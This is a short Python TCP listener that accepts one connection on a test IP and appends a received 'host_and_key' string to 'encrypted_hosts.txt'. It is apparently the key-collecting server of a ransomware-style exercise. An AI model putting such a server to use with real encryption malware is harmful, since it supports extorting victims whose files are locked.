import socket

IP = "192.168.1.68" # Test IP
PORT = 9700

print("Creating socket...")
with socket.socket() as sock:
    sock.bind((IP,PORT))
    print("Listening for connections...")
    sock.listen(1)
    conn, addr = sock.accept()
    print(f"Connection from {addr}!")
    with conn:
        while True:
            host_and_key = conn.recv(1024).decode("utf-8")
            with open("encrypted_hosts.txt", "a") as f:
                f.write(host_and_key + "\n")
            break
        print("Connection completed and closed!")